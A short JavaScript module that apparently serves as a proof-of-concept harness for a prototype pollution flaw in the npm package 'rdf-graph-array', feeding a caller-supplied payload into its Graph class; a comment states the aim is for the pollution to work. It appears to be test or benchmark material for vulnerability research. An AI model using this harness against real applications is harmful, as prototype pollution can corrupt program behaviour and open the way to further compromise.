function exploitFunction(payload) {
    const Graph = require("rdf-graph-array").Graph;
    let g = new Graph();

    g.add(payload);

    // Ensure the graph is properly constructed and the prototype pollution works
    return g;
}

module.exports = { exploitFunction };